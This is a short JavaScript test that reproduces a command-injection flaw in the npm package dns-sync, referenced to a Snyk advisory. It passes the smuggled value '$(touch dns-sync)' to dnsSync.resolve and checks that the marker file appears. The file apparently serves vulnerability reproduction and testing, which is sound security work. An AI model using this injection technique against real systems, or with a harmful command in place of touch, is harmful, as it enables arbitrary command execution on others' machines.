//https://snyk.io/vuln/npm:dns-sync:20141111
test("Command Injection in dns-sync", () => {
  const dnsSync = require("dns-sync");
  const fs = require("fs");
  const path = "./dns-sync";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  dnsSync.resolve("$(touch dns-sync)");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
